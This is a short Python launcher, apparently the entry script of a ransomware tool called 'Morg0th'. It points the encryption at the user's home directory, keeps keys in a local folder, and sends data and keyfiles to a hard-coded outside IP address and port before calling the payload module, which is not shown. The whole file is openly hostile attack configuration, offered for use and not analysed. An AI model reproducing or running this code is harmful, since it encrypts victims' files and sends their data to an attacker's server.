# morg0th scripted by n4zgu1

import src.main as launch
from datetime import datetime
from pathlib import Path

target = Path.home()       # folder to encrypt
keyfolder = 'morgoth-keys'  # folder to  safe keyfiles
HOST = '68.183.208.119'          # ip of server to send data and keyfiles
PORT = 9999                 # port of server

print(f'Launching Morg0th at {datetime.now().strftime("%H:%M:%S")}')
launch.morgoth(target, keyfolder, HOST, PORT)
